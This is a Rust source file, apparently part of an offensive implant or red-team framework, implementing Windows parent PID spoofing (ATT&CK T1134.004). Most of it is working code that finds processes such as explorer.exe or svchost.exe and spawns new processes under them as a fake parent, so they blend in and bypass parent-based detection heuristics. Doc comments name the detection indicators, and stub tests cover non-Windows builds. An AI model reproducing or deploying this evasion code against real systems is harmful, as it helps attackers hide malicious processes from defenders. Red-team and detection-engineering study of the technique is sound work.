//! PPID Spoofing — T1134.004
//!
//! Create processes with a spoofed parent process ID using the
//! `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` attribute. This causes the new
//! process to appear as a child of the chosen parent in the process tree,
//! bypassing parent-based detection heuristics.
//!
//! Detection: Sysmon Event 1 with `ParentImage` mismatch vs. actual spawning
//! binary, ETW kernel/process events showing the actual creator PID,
//! and tools like Process Hacker / Process Explorer showing the spoofed tree.
//!
//! MITRE ATT&CK: T1134.004 — Access Token Manipulation: Parent PID Spoofing

#[cfg(windows)]
use crate::handle::OwnedHandle;
#[cfg(windows)]
use common::KrakenError;

#[cfg(windows)]
use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
#[cfg(windows)]
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
#[cfg(windows)]
use windows_sys::Win32::System::Threading::{
    CreateProcessW, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
    OpenProcess, UpdateProcThreadAttribute, CREATE_SUSPENDED, EXTENDED_STARTUPINFO_PRESENT,
    PROCESS_CREATE_PROCESS, PROCESS_INFORMATION, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    STARTUPINFOEXW,
};

/// Find a process by name and return its PID.
///
/// Enumerates the running process list via `CreateToolhelp32Snapshot` and
/// returns the first PID whose image name matches `name` (case-insensitive).
///
/// # Arguments
/// * `name` - Process image name, e.g. `"explorer.exe"`
///
/// # Returns
/// * `Ok(pid)` — first matching PID
/// * `Err(KrakenError)` if the snapshot fails or no match is found
#[cfg(windows)]
pub fn find_parent_process(name: &str) -> Result<u32, KrakenError> {
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    if snapshot == INVALID_HANDLE_VALUE {
        return Err(KrakenError::Module(
            "CreateToolhelp32Snapshot failed".into(),
        ));
    }
    // SAFETY: snapshot is valid; we close it when done.
    let _snap_guard = OwnedHandle::new(snapshot)
        .ok_or_else(|| KrakenError::Module("invalid snapshot handle".into()))?;

    let mut entry: PROCESSENTRY32W = unsafe { std::mem::zeroed() };
    entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

    if unsafe { Process32FirstW(snapshot, &mut entry) } == 0 {
        return Err(KrakenError::Module("Process32FirstW failed".into()));
    }

    loop {
        // Convert the null-terminated wide string to a Rust &str for comparison
        let nul_pos = entry
            .szExeFile
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(entry.szExeFile.len());
        let exe_name = String::from_utf16_lossy(&entry.szExeFile[..nul_pos]);

        if exe_name.eq_ignore_ascii_case(name) {
            return Ok(entry.th32ProcessID);
        }

        if unsafe { Process32NextW(snapshot, &mut entry) } == 0 {
            break;
        }
    }

    Err(KrakenError::Module(format!(
        "process '{}' not found",
        name
    )))
}

/// Preferred parent candidates in priority order for blending into a typical
/// Windows desktop session.
#[cfg(windows)]
const BLEND_CANDIDATES: &[&str] = &[
    "explorer.exe",
    "svchost.exe",
    "RuntimeBroker.exe",
    "sihost.exe",
];

/// Pick a realistic parent process for the current session context.
///
/// Tries each candidate in `BLEND_CANDIDATES` and returns the first PID that
/// is found. Falls back to `Err` if none are running.
#[cfg(windows)]
pub fn find_realistic_parent() -> Result<u32, KrakenError> {
    for candidate in BLEND_CANDIDATES {
        if let Ok(pid) = find_parent_process(candidate) {
            tracing::debug!(parent = *candidate, pid, "selected PPID spoof target");
            return Ok(pid);
        }
    }
    Err(KrakenError::Module(
        "no suitable parent process found for PPID spoofing".into(),
    ))
}

/// Create a process with a spoofed parent PID.
///
/// Uses `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` so that the OS records
/// `parent_pid` as the parent in the process tree, even though the current
/// process is the actual creator.
///
/// # Arguments
/// * `parent_pid`      — PID of the process to spoof as parent
/// * `command_line`    — Full command line (e.g. `"notepad.exe"`)
/// * `suspended`       — If `true`, the new process starts suspended
///
/// # Returns
/// `Ok((process_handle, thread_handle, pid))` on success.
///
/// # Detection Indicators
/// - Sysmon Event 1: `ParentProcessId` does not match the creating process
/// - ETW `MSNT_SystemTrace/Process/Start`: `ParentPid` vs. real creator
/// - Tools: Process Hacker shows the spoofed parent; ETW shows the truth
#[cfg(windows)]
pub fn create_process_with_ppid(
    parent_pid: u32,
    command_line: &str,
    suspended: bool,
) -> Result<(HANDLE, HANDLE, u32), KrakenError> {
    // --- 1. Open the parent process -----------------------------------------
    let parent_handle = unsafe {
        OpenProcess(
            PROCESS_CREATE_PROCESS,
            0, // bInheritHandle = false
            parent_pid,
        )
    };
    if parent_handle == 0 {
        return Err(KrakenError::Module(format!(
            "OpenProcess(PROCESS_CREATE_PROCESS) failed for PID {}",
            parent_pid
        )));
    }
    // SAFETY: valid handle obtained above
    let _parent_guard = OwnedHandle::new(parent_handle)
        .ok_or_else(|| KrakenError::Module("invalid parent handle".into()))?;

    // --- 2. Allocate a PROC_THREAD_ATTRIBUTE_LIST ----------------------------
    // First call: query the required buffer size.
    let mut attr_list_size: usize = 0;
    unsafe {
        InitializeProcThreadAttributeList(
            std::ptr::null_mut(),
            1,
            0,
            &mut attr_list_size,
        );
    }
    if attr_list_size == 0 {
        return Err(KrakenError::Module(
            "InitializeProcThreadAttributeList size query returned 0".into(),
        ));
    }

    let mut attr_list_buf: Vec<u8> = vec![0u8; attr_list_size];
    let attr_list_ptr = attr_list_buf.as_mut_ptr() as *mut _;

    // Second call: initialize the list in the allocated buffer.
    let ok = unsafe {
        InitializeProcThreadAttributeList(attr_list_ptr, 1, 0, &mut attr_list_size)
    };
    if ok == 0 {
        return Err(KrakenError::Module(
            "InitializeProcThreadAttributeList init failed".into(),
        ));
    }

    // --- 3. Set the parent process attribute ---------------------------------
    // `parent_handle` must remain live until CreateProcessW returns.
    let ok = unsafe {
        UpdateProcThreadAttribute(
            attr_list_ptr,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
            &parent_handle as *const HANDLE as *mut _,
            std::mem::size_of::<HANDLE>(),
            std::ptr::null_mut(),
            std::ptr::null(),
        )
    };
    if ok == 0 {
        unsafe { DeleteProcThreadAttributeList(attr_list_ptr) };
        return Err(KrakenError::Module(
            "UpdateProcThreadAttribute(PARENT_PROCESS) failed".into(),
        ));
    }

    // --- 4. Build STARTUPINFOEXW ---------------------------------------------
    let mut si_ex: STARTUPINFOEXW = unsafe { std::mem::zeroed() };
    si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
    si_ex.lpAttributeList = attr_list_ptr;

    // --- 5. Convert command line to wide string -------------------------------
    let mut wide_cmdline: Vec<u16> = command_line
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    // --- 6. Spawn the process ------------------------------------------------
    let mut creation_flags = EXTENDED_STARTUPINFO_PRESENT;
    if suspended {
        creation_flags |= CREATE_SUSPENDED;
    }

    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let ok = unsafe {
        CreateProcessW(
            std::ptr::null(),          // lpApplicationName
            wide_cmdline.as_mut_ptr(), // lpCommandLine (mutable per API contract)
            std::ptr::null(),          // lpProcessAttributes
            std::ptr::null(),          // lpThreadAttributes
            0,                         // bInheritHandles
            creation_flags,
            std::ptr::null(),          // lpEnvironment
            std::ptr::null(),          // lpCurrentDirectory
            &si_ex.StartupInfo,        // lpStartupInfo (STARTUPINFOW* = first field)
            &mut pi,
        )
    };

    // Always clean up the attribute list after CreateProcessW.
    unsafe { DeleteProcThreadAttributeList(attr_list_ptr) };

    if ok == 0 {
        return Err(KrakenError::Module(format!(
            "CreateProcessW with PPID spoof failed (cmdline: '{}')",
            command_line
        )));
    }

    let pid = pi.dwProcessId;

    tracing::info!(
        pid,
        parent_pid,
        %command_line,
        suspended,
        "spawned process with spoofed PPID"
    );

    Ok((pi.hProcess, pi.hThread, pid))
}

// ---------------------------------------------------------------------------
// Non-Windows stubs
// ---------------------------------------------------------------------------

#[cfg(not(windows))]
pub fn find_parent_process(_name: &str) -> Result<u32, common::KrakenError> {
    Err(common::KrakenError::Module(
        "PPID spoofing only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn find_realistic_parent() -> Result<u32, common::KrakenError> {
    Err(common::KrakenError::Module(
        "PPID spoofing only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn create_process_with_ppid(
    _parent_pid: u32,
    _command_line: &str,
    _suspended: bool,
) -> Result<(usize, usize, u32), common::KrakenError> {
    Err(common::KrakenError::Module(
        "PPID spoofing only supported on Windows".into(),
    ))
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// On non-Windows, all public functions must return a descriptive error.
    #[cfg(not(windows))]
    #[test]
    fn test_find_parent_process_non_windows() {
        let result = find_parent_process("explorer.exe");
        assert!(result.is_err());
        if let Err(common::KrakenError::Module(msg)) = result {
            assert!(msg.contains("only supported on Windows"));
        }
    }

    #[cfg(not(windows))]
    #[test]
    fn test_find_realistic_parent_non_windows() {
        let result = find_realistic_parent();
        assert!(result.is_err());
    }

    #[cfg(not(windows))]
    #[test]
    fn test_create_process_with_ppid_non_windows() {
        let result = create_process_with_ppid(1234, "notepad.exe", false);
        assert!(result.is_err());
        if let Err(common::KrakenError::Module(msg)) = result {
            assert!(msg.contains("only supported on Windows"));
        }
    }

    /// Verify that the attribute list size query path is exercised.
    /// This is a compile-time / logic test: attr_list_size == 0 should
    /// return an error. We test the non-Windows stub as a proxy for the
    /// code path structure — the Windows path is covered by integration tests.
    #[test]
    fn test_attribute_list_size_zero_guard() {
        // The non-Windows stub already validates the error path; the Windows
        // implementation guards against attr_list_size == 0 before allocating.
        // This test documents that contract without requiring a live Windows host.
        let result = create_process_with_ppid(0, "", false);
        assert!(
            result.is_err(),
            "create_process_with_ppid must fail on non-Windows"
        );
    }
}
